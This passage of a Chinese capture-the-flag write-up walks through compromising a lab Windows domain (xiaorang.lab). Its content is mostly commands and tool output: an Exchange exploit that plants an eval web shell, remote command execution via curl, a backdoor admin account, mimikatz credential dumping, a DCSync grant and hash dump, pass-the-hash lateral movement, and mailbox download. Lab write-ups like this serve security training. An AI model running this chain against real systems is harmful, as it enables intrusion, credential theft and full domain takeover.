</span></span><span class="line"><span class="ln">209</span><span class="cl">[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6548 =&gt; 
</span></span><span class="line"><span class="ln">210</span><span class="cl">[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6550 =&gt; 
</span></span><span class="line"><span class="ln">211</span><span class="cl">[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6571 =&gt; 
</span></span><span class="line"><span class="ln">212</span><span class="cl">[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6564 =&gt; 
</span></span><span class="line"><span class="ln">213</span><span class="cl">[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6570 =&gt; 
</span></span><span class="line"><span class="ln">214</span><span class="cl">[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6572 =&gt; 
</span></span><span class="line"><span class="ln">215</span><span class="cl">[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6578 =&gt; 
</span></span><span class="line"><span class="ln">216</span><span class="cl">[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6590 =&gt; 
</span></span><span class="line"><span class="ln">217</span><span class="cl">[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6594 =&gt; 
</span></span><span class="line"><span class="ln">218</span><span class="cl">[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6606 =&gt; 
</span></span><span class="line"><span class="ln">219</span><span class="cl">[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6616 =&gt; 
</span></span><span class="line"><span class="ln">220</span><span class="cl">[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6621 =&gt; 
</span></span><span class="line"><span class="ln">221</span><span class="cl">[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6624 =&gt; 
</span></span><span class="line"><span class="ln">222</span><span class="cl">[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6642 =&gt; 
</span></span><span class="line"><span class="ln">223</span><span class="cl">[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6685 =&gt; 
</span></span><span class="line"><span class="ln">224</span><span class="cl">[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6690 =&gt; 
</span></span><span class="line"><span class="ln">225</span><span class="cl">[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6719 =&gt; 
</span></span><span class="line"><span class="ln">226</span><span class="cl">[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6728 =&gt; 
</span></span><span class="line"><span class="ln">227</span><span class="cl">[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6741 =&gt; 
</span></span><span class="line"><span class="ln">228</span><span class="cl">[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6770 =&gt; 
</span></span><span class="line"><span class="ln">229</span><span class="cl">[2025-04-09 00:53:12] [SUCCESS] 服务识别 172.22.3.9:6772 =&gt; 
</span></span><span class="line"><span class="ln">230</span><span class="cl">[2025-04-09 00:53:13] [SUCCESS] 服务识别 172.22.3.9:7673 =&gt; 
</span></span><span class="line"><span class="ln">231</span><span class="cl">[2025-04-09 00:53:13] [SUCCESS] 服务识别 172.22.3.9:6560 =&gt; 
</span></span><span class="line"><span class="ln">232</span><span class="cl">[2025-04-09 00:53:15] [SUCCESS] 服务识别 172.22.3.9:8172 =&gt; 
</span></span><span class="line"><span class="ln">233</span><span class="cl">[2025-04-09 00:53:20] [SUCCESS] 服务识别 172.22.3.9:443 =&gt; 
</span></span><span class="line"><span class="ln">234</span><span class="cl">[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.2:47001
</span></span><span class="line"><span class="ln">235</span><span class="cl">[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.26:47001
</span></span><span class="line"><span class="ln">236</span><span class="cl">[2025-04-09 00:53:31] [SUCCESS] 端口开放 172.22.3.9:47001
</span></span><span class="line"><span class="ln">237</span><span class="cl">[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.2:47001 =<span class="p">&gt;</span> [http]
</span></span><span class="line"><span class="ln">238</span><span class="cl">[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.9:47001 =<span class="p">&gt;</span> [http]
</span></span><span class="line"><span class="ln">239</span><span class="cl">[2025-04-09 00:53:36] [SUCCESS] 服务识别 172.22.3.26:47001 =<span class="p">&gt;</span> [http]
</span></span><span class="line"><span class="ln">240</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49665
</span></span><span class="line"><span class="ln">241</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49664
</span></span><span class="line"><span class="ln">242</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49667
</span></span><span class="line"><span class="ln">243</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49664
</span></span><span class="line"><span class="ln">244</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49666
</span></span><span class="line"><span class="ln">245</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49667
</span></span><span class="line"><span class="ln">246</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49666
</span></span><span class="line"><span class="ln">247</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49665
</span></span><span class="line"><span class="ln">248</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49668
</span></span><span class="line"><span class="ln">249</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49669
</span></span><span class="line"><span class="ln">250</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49670
</span></span><span class="line"><span class="ln">251</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49671
</span></span><span class="line"><span class="ln">252</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49673
</span></span><span class="line"><span class="ln">253</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49674
</span></span><span class="line"><span class="ln">254</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49675
</span></span><span class="line"><span class="ln">255</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49677
</span></span><span class="line"><span class="ln">256</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.26:49678
</span></span><span class="line"><span class="ln">257</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49684
</span></span><span class="line"><span class="ln">258</span><span class="cl">[2025-04-09 00:53:38] [SUCCESS] 端口开放 172.22.3.2:49695
</span></span><span class="line"><span class="ln">259</span><span class="cl">[2025-04-09 00:53:39] [SUCCESS] 服务识别 172.22.3.2:49674 =<span class="p">&gt;</span> [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0]
</span></span><span class="line"><span class="ln">260</span><span class="cl">[2025-04-09 00:53:55] [SUCCESS] 端口开放 172.22.3.2:52352
</span></span><span class="line"><span class="ln">261</span><span class="cl">[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49665 =&gt; 
</span></span><span class="line"><span class="ln">262</span><span class="cl">[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49664 =&gt; 
</span></span><span class="line"><span class="ln">263</span><span class="cl">[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49667 =&gt; 
</span></span><span class="line"><span class="ln">264</span><span class="cl">[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49664 =&gt; 
</span></span><span class="line"><span class="ln">265</span><span class="cl">[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.2:49666 =&gt; 
</span></span><span class="line"><span class="ln">266</span><span class="cl">[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49667 =&gt; 
</span></span><span class="line"><span class="ln">267</span><span class="cl">[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49666 =&gt; 
</span></span><span class="line"><span class="ln">268</span><span class="cl">[2025-04-09 00:54:33] [SUCCESS] 服务识别 172.22.3.26:49665 =&gt; 
</span></span><span class="line"><span class="ln">269</span><span class="cl">[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49668 =&gt; 
</span></span><span class="line"><span class="ln">270</span><span class="cl">[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49669 =&gt; 
</span></span><span class="line"><span class="ln">271</span><span class="cl">[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49670 =&gt; 
</span></span><span class="line"><span class="ln">272</span><span class="cl">[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49671 =&gt; 
</span></span><span class="line"><span class="ln">273</span><span class="cl">[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49673 =&gt; 
</span></span><span class="line"><span class="ln">274</span><span class="cl">[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49675 =&gt; 
</span></span><span class="line"><span class="ln">275</span><span class="cl">[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49677 =&gt; 
</span></span><span class="line"><span class="ln">276</span><span class="cl">[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.26:49678 =&gt; 
</span></span><span class="line"><span class="ln">277</span><span class="cl">[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49684 =&gt; 
</span></span><span class="line"><span class="ln">278</span><span class="cl">[2025-04-09 00:54:34] [SUCCESS] 服务识别 172.22.3.2:49695 =&gt; 
</span></span><span class="line"><span class="ln">279</span><span class="cl">[2025-04-09 00:54:46] [SUCCESS] 端口开放 172.22.3.9:64327
</span></span><span class="line"><span class="ln">280</span><span class="cl">[2025-04-09 00:54:46] [SUCCESS] 端口开放 172.22.3.9:64337
</span></span><span class="line"><span class="ln">281</span><span class="cl">[2025-04-09 00:54:50] [SUCCESS] 服务识别 172.22.3.2:52352 =&gt; 
</span></span><span class="line"><span class="ln">282</span><span class="cl">[2025-04-09 00:54:51] [SUCCESS] 服务识别 172.22.3.9:64337 =&gt; 
</span></span><span class="line"><span class="ln">283</span><span class="cl">[2025-04-09 00:55:41] [SUCCESS] 服务识别 172.22.3.9:64327 =&gt; 
</span></span><span class="line"><span class="ln">284</span><span class="cl">[2025-04-09 00:55:41] [INFO] 存活端口数量: 130
</span></span><span class="line"><span class="ln">285</span><span class="cl">[2025-04-09 00:55:41] [INFO] 开始漏洞扫描
</span></span><span class="line"><span class="ln">286</span><span class="cl">[2025-04-09 00:55:41] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, rdp, smb, smb2, smbghost, smtp, webpoc, webtitle
</span></span><span class="line"><span class="ln">287</span><span class="cl">[2025-04-09 00:55:41] [SUCCESS] 网站标题 http://172.22.3.9         状态码:403 长度:0      标题:无标题
</span></span><span class="line"><span class="ln">288</span><span class="cl">[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果
</span></span><span class="line"><span class="ln">289</span><span class="cl">目标主机: 172.22.3.9
</span></span><span class="line"><span class="ln">290</span><span class="cl">主机名: XIAORANG-EXC01
</span></span><span class="line"><span class="ln">291</span><span class="cl">发现的网络接口:
</span></span><span class="line"><span class="ln">292</span><span class="cl">   IPv4地址:
</span></span><span class="line"><span class="ln">293</span><span class="cl">      └─ 172.22.3.9
</span></span><span class="line"><span class="ln">294</span><span class="cl">[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果
</span></span><span class="line"><span class="ln">295</span><span class="cl">目标主机: 172.22.3.2
</span></span><span class="line"><span class="ln">296</span><span class="cl">主机名: XIAORANG-WIN16
</span></span><span class="line"><span class="ln">297</span><span class="cl">发现的网络接口:
</span></span><span class="line"><span class="ln">298</span><span class="cl">   IPv4地址:
</span></span><span class="line"><span class="ln">299</span><span class="cl">      └─ 172.22.3.2
</span></span><span class="line"><span class="ln">300</span><span class="cl">[2025-04-09 00:55:41] [INFO] 系统信息 172.22.3.2 [Windows Server 2016 Datacenter 14393]
</span></span><span class="line"><span class="ln">301</span><span class="cl">[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.26     XIAORANG\XIAORANG-PC          
</span></span><span class="line"><span class="ln">302</span><span class="cl">[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.2      DC:XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393
</span></span><span class="line"><span class="ln">303</span><span class="cl">[2025-04-09 00:55:41] [SUCCESS] 网站标题 http://172.22.3.9:81      状态码:403 长度:1157   标题:403 - 禁止访问: 访问被拒绝。
</span></span><span class="line"><span class="ln">304</span><span class="cl">[2025-04-09 00:55:41] [SUCCESS] NetInfo 扫描结果
</span></span><span class="line"><span class="ln">305</span><span class="cl">目标主机: 172.22.3.26
</span></span><span class="line"><span class="ln">306</span><span class="cl">主机名: XIAORANG-PC
</span></span><span class="line"><span class="ln">307</span><span class="cl">发现的网络接口:
</span></span><span class="line"><span class="ln">308</span><span class="cl">   IPv4地址:
</span></span><span class="line"><span class="ln">309</span><span class="cl">      └─ 172.22.3.26
</span></span><span class="line"><span class="ln">310</span><span class="cl">[2025-04-09 00:55:41] [SUCCESS] NetBios 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         Windows Server 2016 Datacenter 14393
</span></span><span class="line"><span class="ln">311</span><span class="cl">[2025-04-09 00:55:42] [SUCCESS] SMTP服务 172.22.3.9:25 允许匿名访问
</span></span><span class="line"><span class="ln">312</span><span class="cl">[2025-04-09 00:55:42] [SUCCESS] 网站标题 https://172.22.3.9        状态码:302 长度:0      标题:无标题 重定向地址: https://172.22.3.9/owa/
</span></span><span class="line"><span class="ln">313</span><span class="cl">[2025-04-09 00:55:42] [SUCCESS] 网站标题 https://172.22.3.9/owa/auth/logon.aspx?url=https<span class="nv">%3</span>a<span class="nv">%2</span>f<span class="nv">%2</span>f172.22.3.9<span class="nv">%2</span>fowa<span class="nv">%2</span>f<span class="p">&amp;</span>reason=0 状态码:200 长度:28237  标题:Outlook
</span></span><span class="line"><span class="ln">314</span><span class="cl">[2025-04-09 00:55:42] [SUCCESS] 网站标题 https://172.22.3.9:8172   状态码:404 长度:0      标题:无标题
</span></span></code></pre></div><p>扫到三台机子</p>
<pre tabindex="0"><code>172.22.3.9 XIAORANG-EXC01
172.22.3.2  DC:XIAORANG-WIN16.xiaorang.lab
172.22.3.26 XIAORANG-PC
</code></pre><p>172.22.3.9上有一个exchange服务，有nday，直接上exprolog</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">python .\exprolog.py -t 172.22.3.9 -e administrator@xiaorang.lab
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">___________      __________               .__
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">\_   _____/__  __\______   \_______  ____ <span class="p">|</span>  <span class="p">|</span>   ____   ____
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"> <span class="p">|</span>    __)_\  \/  /<span class="p">|</span>     ___/\_  __ \/  _ \<span class="p">|</span>  <span class="p">|</span>  /  _ \ / ___\
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"> <span class="p">|</span>        \<span class="p">&gt;</span>    &lt; <span class="p">|</span>    <span class="p">|</span>     <span class="p">|</span>  <span class="p">|</span> \(  <span class="p">&lt;</span>_<span class="p">&gt;</span> )  <span class="p">|</span>_(  <span class="p">&lt;</span>_<span class="p">&gt;</span> ) /_/  &gt;
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">/_______  /__/\_ \<span class="p">|</span>____<span class="p">|</span>     <span class="p">|</span>__<span class="p">|</span>   \____/<span class="p">|</span>____/\____/\___  /
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        \/      \/                                   /_____/
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl">[#] Trying to get target FQDN
</span></span><span class="line"><span class="ln">11</span><span class="cl">[+] Got target FQDN: XIAORANG-EXC01
</span></span><span class="line"><span class="ln">12</span><span class="cl">[#] Trying to get target LegacyDN and ServerID
</span></span><span class="line"><span class="ln">13</span><span class="cl">[+] Got target LegacyDN: /o=XIAORANG LAB/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=8ca6ff254802459d9f63ee916eabb487-Administrat
</span></span><span class="line"><span class="ln">14</span><span class="cl">[+] Got target ServerID: b5ebdaa1-b4b3-4b71-ab32-7d03b4955a75
</span></span><span class="line"><span class="ln">15</span><span class="cl">[#] Trying to get target user SID
</span></span><span class="line"><span class="ln">16</span><span class="cl">[+] Got target administrator SID: S-1-5-21-533686307-2117412543-4200729784-500
</span></span><span class="line"><span class="ln">17</span><span class="cl">[#] Trying to get target administrator cookie sessions
</span></span><span class="line"><span class="ln">18</span><span class="cl">[+] Got target administrator session ID: fefab382-b49c-4a85-a748-8cee14485956
</span></span><span class="line"><span class="ln">19</span><span class="cl">[+] Got target administrator canary session ID: atsaGpfQ70qSuQAOEtYUV5LqJeTxeN0IkjUqGKytbR0zbRHwhB5ynGGNyD8fBXd6AyUH2qDHj9M.
</span></span><span class="line"><span class="ln">20</span><span class="cl">[#] Trying to get target OABVirtualDirectory ID
</span></span><span class="line"><span class="ln">21</span><span class="cl">[+] Got target AOB ID: 6d8fb74b-8477-43ee-83ba-0b119205e85f
</span></span><span class="line"><span class="ln">22</span><span class="cl">[#] Trying to inject OABVirtualDirectory Shell
</span></span><span class="line"><span class="ln">23</span><span class="cl">[+] Shell are injected
</span></span><span class="line"><span class="ln">24</span><span class="cl">[#] Verifying OABVirtualDirectory Shell
</span></span><span class="line"><span class="ln">25</span><span class="cl">[+] AOB Shell verified
</span></span><span class="line"><span class="ln">26</span><span class="cl">[+] AOB Shell payload: http:\/\/ooo\/#<span class="nv">%3</span>Cscript<span class="nv">%2</span>0language=<span class="nv">%2</span>2JScript<span class="nv">%2</span>2<span class="nv">%2</span>0runat=<span class="nv">%2</span>2server<span class="nv">%2</span>2<span class="nv">%3</span>Efunction<span class="nv">%2</span>0Page_Load()<span class="nv">%7</span>Beval(Request<span class="nv">%5</span>B<span class="nv">%2</span>2request<span class="nv">%2</span>2<span class="nv">%5</span>D,<span class="nv">%2</span>2unsafe<span class="nv">%2</span>2);<span class="nv">%7</span>D<span class="nv">%3</span>C\/script<span class="nv">%3</span>E
</span></span><span class="line"><span class="ln">27</span><span class="cl">[#] Trying to export OABVirtualDirectory Shell
</span></span><span class="line"><span class="ln">28</span><span class="cl">[+] Shell are exported
</span></span><span class="line"><span class="ln">29</span><span class="cl">[*] CURL Request:
</span></span><span class="line"><span class="ln">30</span><span class="cl">curl --request POST --url https://172.22.3.9/owa/auth/pjo2b.aspx --header &#39;Content-Type: application/x-www-form-urlencoded&#39; --data &#39;request=Response.Write(new ActiveXObject(<span class="s2">&#34;WScript.Shell&#34;</span>).exec(<span class="s2">&#34;whoami /all&#34;</span>).stdout.readall())&#39; -k
</span></span><span class="line"><span class="ln">31</span><span class="cl">[*] DONE
</span></span></code></pre></div><p>发现可以RCE</p>
<pre tabindex="0"><code>proxychains4 curl --request POST --url https://172.22.3.9/owa/auth/pjo2b.aspx --header &#39;Content-Type: application/x-www-form-urlencoded&#39; --data &#39;request=Response.Write(new ActiveXObject(&#34;WScript.Shell&#34;).exec(&#34;whoami&#34;).stdout.readall())&#39; -k
</code></pre><p>写用户RDP上去拿flag</p>
<pre tabindex="0"><code>net user xrntkk abc123456 /add
net localgroup administrators xrntkk /add
</code></pre><p><img alt="image-20250409203509023" loading="lazy" src="../assets/image-20250409203509023.png"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">Yb  dP 88    db     dP<span class="s2">&#34;Yb  88&#34;&#34;Yb    db    88b 88  dP&#34;&#34;b8 </span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"> YbdP  88   dPYb   dP   Yb 88__dP   dPYb   88Yb88 dP   `<span class="s2">&#34; </span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"> dPYb  88  dP__Yb  Yb   dP 88<span class="s2">&#34;Yb   dP__Yb  88 Y88 Yb  &#34;</span>88 
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">dP  Yb 88 dP<span class="s2">&#34;&#34;&#34;&#34;</span>Yb  YbodP  88  Yb dP<span class="s2">&#34;&#34;&#34;&#34;</span>Yb 88  Y8  YboodP 
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    / /                                        
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">   / /                  _   __     ( )  ___    
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  / /        //   / / // ) )  ) ) / / //   ) ) 
</span></span><span class="line"><span class="ln">10</span><span class="cl"> / /        //   / / // / /  / / / / //   / /  
</span></span><span class="line"><span class="ln">11</span><span class="cl">/ /____/ / ((___( ( // / /  / / / / ((___( (   
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl">flag02: flag{aefcc6d0-0d3c-44aa-b96c-c8ad50e6d2d4}
</span></span></code></pre></div><h3 id="flag4">FLAG4<a hidden class="anchor" aria-hidden="true" href="#flag4">#</a></h3>
<p>信息收集一手</p>
<p>这是域内的一台机子</p>
<p><img alt="image-20250409203726645" loading="lazy" src="../assets/image-20250409203726645.png"></p>
<p>接着传个mimikatz，抓取哈希</p>
<p>用管理员打开mimikatz</p>
<pre tabindex="0"><code>log
privilege::Debug 
sekurlsa::logonpasswords 
exit
</code></pre><p>抓到两个hash</p>
<p>一个是机器用户的hash，一个是用户zhangtong</p>
<pre tabindex="0"><code>Authentication Id : 0 ; 10480581 (00000000:009febc5)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2025/4/9 20:32:31
SID               : S-1-5-90-0-3
        msv :
         [00000003] Primary
         * Username : XIAORANG-EXC01$
         * Domain   : XIAORANG
         * NTLM     : 9b2081c3dc250a9b0a55c54c4dcc9cbb
         * SHA1     : 336d62cd7f3bc62aba936763ace82491e96f2eed
         
         
Authentication Id : 0 ; 105924 (00000000:00019dc4)
Session           : Service from 0
User Name         : Zhangtong
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2025/4/9 19:36:36
SID               : S-1-5-21-533686307-2117412543-4200729784-1147
        msv :
         [00000003] Primary
         * Username : Zhangtong
         * Domain   : XIAORANG
         * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4
         * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e
         * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b
</code></pre><p>接下来利用system权限用bloodhound信息收集一波</p>
<pre tabindex="0"><code>proxychains4 bloodhound-python -u &#34;XIAORANG-EXC01$&#34; --hashes :9b2081c3dc250a9b0a55c54c4dcc9cbb -d xiaorang.lab -dc XIAORANG-WIN16.xiaorang.lab -c all --dns-tcp -ns 172.22.3.2 --auth-method ntlm --zip
</code></pre><p><img alt="image-20250409212457772" loading="lazy" src="../assets/image-20250409212457772.png"></p>
<p>发现这台机子对域内的用户具有WriteDACL权限，也就是说我们可以利用机器用户给域内的用户添加dcsync权限，从而拿到域管的hash。</p>
<pre tabindex="0"><code>python dacledit.py xiaorang.lab/XIAORANG-EXC01$ -hashes :9b2081c3dc250a9b0a55c54c4dcc9cbb -action write -rights DCSync -principal XIAORANG-EXC01$ -target-dn &#34;DC=xiaorang,DC=lab&#34; -dc-ip 172.22.3.2
</code></pre><p><img alt="image-20250409213411858" loading="lazy" src="../assets/image-20250409213411858.png"></p>
<p>接下来我们就可以利用dcsync去dump域管的hash了</p>
<pre tabindex="0"><code>proxychains4 python3 psexec.py xiaorang.lab/XIAORANG-EXC01\$@172.22.3.9 -hashes &#39;:9b2081c3dc250a9b0a55c54c4dcc9cbb&#39; -codec gbk
</code></pre><pre tabindex="0"><code>c:\&gt; .\mimikatz.exe &#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34; exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] &#39;xiaorang.lab&#39; will be the domain
[DC] &#39;XIAORANG-WIN16.xiaorang.lab&#39; will be the DC server
[DC] Exporting domain &#39;xiaorang.lab&#39;
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  b8fa79a52e918cb0cbcd1c0ede492647        514
1137    HealthMailboxeda7a84    1e89e23e265bb7b54dc87938b1b1a131        66048
1138    HealthMailbox33b01cf    0eff3de35019c2ee10b68f48941ac50d        66048
1139    HealthMailbox9570292    e434c7db0f0a09de83f3d7df25ec2d2f        66048
1140    HealthMailbox3479a75    c43965ecaa92be22c918e2604e7fbea0        66048
1141    HealthMailbox2d45c5b    4822b67394d6d93980f8e681c452be21        66048
1142    HealthMailboxec2d542    147734fa059848c67553dc663782e899        66048
1143    HealthMailboxf5f7dbd    e7e4f69b43b92fb37d8e9b20848e6b66        66048
1144    HealthMailbox67dc103    4fe68d094e3e797cfc4097e5cca772eb        66048
1145    HealthMailbox320fc73    0c3d5e9fa0b8e7a830fcf5acaebe2102        66048
1146    Lumia   862976f8b23c13529c2fb1428e710296        512
500     Administrator   7acbc09a6c0efd81bfa7d5a1d4238beb        512
1000    XIAORANG-WIN16$ 5410e4604b240a6d7bab43f67637b109        532480
1147    Zhangtong       22c7f81993e96ac83ac2f3f1903de8b4        512
1103    XIAORANG-EXC01$ 9b2081c3dc250a9b0a55c54c4dcc9cbb        4096
1104    XIAORANG-PC$    fc840d385551c896c88c32a65ab5c5ad        4096
1135    HealthMailbox8446c5b    a79a671473279d21ca92fcc8251ec143        66048
1136    HealthMailbox0d5918e    0e9b8e002d34d405e866b4820dfe36eb        66048

mimikatz(commandline) # exit
Bye!
</code></pre><p>拿到域管hash，那我们接下来就可以随意横向了</p>
<pre tabindex="0"><code>500     Administrator   7acbc09a6c0efd81bfa7d5a1d4238beb        512
</code></pre><p>横向拿flag</p>
<pre tabindex="0"><code> proxychains4 python3 psexec.py administrator@172.22.3.2 -hashes &#39;:7acbc09a6c0efd81bfa7d5a1d4238beb&#39; -codec gbk
</code></pre><pre tabindex="0"><code>c:\Users\Administrator\flag&gt; type flag.txt
____  ___.___   _____   ________ __________    _____    _______    ________
\   \/  /|   | /  _  \  \_____  \\______   \  /  _  \   \      \  /  _____/
 \     / |   |/  /_\  \  /   |   \|       _/ /  /_\  \  /   |   \/   \  ___
 /     \ |   /    |    \/    |    \    |   \/    |    \/    |    \    \_\  \
/___/\  \|___\____|__  /\_______  /____|_  /\____|__  /\____|__  /\______  /
      \_/            \/         \/       \/         \/         \/        \/



flag04: flag{204e2d62-c729-4840-8b25-a6c07b6aad44}
</code></pre><p>拿到flag4</p>
<h3 id="flag3">FLAG3<a hidden class="anchor" aria-hidden="true" href="#flag3">#</a></h3>
<p>接下来横向去26拿flag3</p>
<pre tabindex="0"><code>proxychains4 impacket-smbclient -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.26 -dc-ip 172.22.3.2
</code></pre><pre tabindex="0"><code>use C$
cd /users/lumia/desktop
</code></pre><p>在C:\users\lumia\desktop找到一个secret.zip，我们把它get下来</p>
<p><img alt="image-20250409223522418" loading="lazy" src="../assets/image-20250409223522418.png"></p>
<p><img alt="image-20250409224258513" loading="lazy" src="../assets/image-20250409224258513.png"></p>
<p>secret.zip里面有个flag.docx</p>
<p>但是secret.zip需要密码</p>
<p>这里要利用上面拿到的lumia的hash，将outlook中的邮件下载下来</p>
<pre tabindex="0"><code>1146    Lumia   862976f8b23c13529c2fb1428e710296        512
</code></pre><pre tabindex="0"><code>python pthexchange.py --target https://172.22.3.9 --username Lumia --password &#34;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296&#34; --action Download
</code></pre><p><img alt="image-20250409225130259" loading="lazy" src="../assets/image-20250409225130259.png"></p>
<p>拿到两封邮件</p>
<p><img alt="image-20250409225219564" loading="lazy" src="../assets/image-20250409225219564.png"></p>
<p>第一封附件是刚刚的secret.zip，提示说用手机号解密</p>
<p>第二封邮件中附件是一堆名字和手机号</p>
<p>我们用手机号作为字典进行爆破</p>
<p><img alt="image-20250409225625842" loading="lazy" src="../assets/image-20250409225625842.png"></p>
<pre tabindex="0"><code>18763918468
</code></pre><p>拿到flag3</p>
